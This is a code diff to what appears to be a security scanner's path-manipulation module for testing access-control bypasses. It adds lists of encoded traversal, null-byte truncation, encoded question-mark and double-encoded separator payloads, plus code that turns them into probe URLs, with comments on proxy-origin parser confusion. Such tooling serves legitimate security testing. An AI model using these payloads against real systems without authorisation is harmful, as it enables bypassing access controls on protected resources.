@@ -37,6 +37,18 @@ static_extensions = [".ico", ".css", ".js", ".png", ".jpg", ".svg", ".woff2", ".
 # extensions that may route the request to a different handler at the origin
 routing_extensions = [".html", ".php", ".json"]
 
+# Parser-confusion families (Orange Tsai: Breaking Parser Logic / Confusion Attacks).
+# Each exploits a disagreement between how an edge/proxy and the origin parse a path.
+# Encoded '?' truncation: the edge/auth module sees the full string, the origin (mod_proxy +
+# PHP-FPM, rewrite targets) truncates at the decoded '?', dropping the appended suffix.
+qmark_suffixes = ["%3F", "%3F.css", "%3F.php", "%3Fa"]
+# Double-encoded and encoded separators: proxy and origin disagree on how many times to decode.
+separator_payloads = ["%252e", "%252f", "%255c", "%5c"]
+# Encoded control characters that truncate the path at the origin if decoded.
+truncation_suffixes = ["%00", "%0a", "%0d", "%0c", "%26"]
+# Encoded dot-segment traversal: the edge ACL matches the literal prefix, the origin resolves it away.
+traversal_prefixes = ["..%2f", "%2e%2e/", "..%252f", "..%5c"]
+
 
 class path(BaseAccessBypass):
     friendly_name = "Path Manipulation"
@@ -95,6 +107,17 @@ class path(BaseAccessBypass):
 
         for ext in static_extensions + routing_extensions:
             mutations[f"ext:{ext}"] = f"/{stripped}{ext}"
+
+        # parser-confusion families
+        for qp in qmark_suffixes:
+            mutations[f"enc-qmark:{qp}"] = f"/{stripped}{qp}"
+        for sp in separator_payloads:
+            mutations[f"enc-sep-suffix:{sp}"] = f"/{stripped}{sp}"
+            mutations[f"enc-sep-prefix:{sp}"] = f"/{sp}/{stripped}"
+        for cp in truncation_suffixes:
+            mutations[f"enc-trunc:{cp}"] = f"/{stripped}{cp}"
+        for tp in traversal_prefixes:
+            mutations[f"traversal:{tp}"] = f"/{tp}{stripped}"
         return mutations
 
     async def confirm(self, probe, response):
